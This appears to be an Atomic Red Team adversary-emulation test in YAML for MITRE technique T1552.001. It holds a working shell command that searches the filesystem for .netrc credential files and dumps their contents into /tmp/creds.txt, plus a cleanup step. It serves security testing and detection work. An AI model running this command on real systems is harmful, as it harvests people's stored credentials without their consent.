- id: da4f751a-020b-40d7-b9ff-d433b7799803
  name: Find and Access Github Credentials
  description: Find .netrc files, which store GitHub credentials in clear text, and
    dump their contents if found.
  tactic: credential-access
  technique:
    attack_id: T1552.001
    name: 'Unsecured Credentials: Credentials In Files'
  platforms:
    linux:
      sh:
        command: find / -name '.netrc' -type f -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt;
          cat "$1" >> /tmp/creds.txt' _ {} \; 2>/dev/null
        cleanup: rm -f /tmp/creds.txt
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - t1552.001
  - atomic-red-team
  - credential-access
  author: Atomic Red Team
  additional_info:
    input_arguments:
      file_path:
        description: Path to search
        type: string
        default: /
      filename:
        description: Credential file to search for
        type: string
        default: .netrc
      optional_flags:
        description: optional flags passed into find that should be ran
        type: string
        default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
          _ {} \;
    technique_created: '2020-02-04T12:52:13.006Z'
    atomic_guid: da4f751a-020b-40d7-b9ff-d433b7799803
    import_timestamp: '2026-09-06T06:52:20.395422Z'
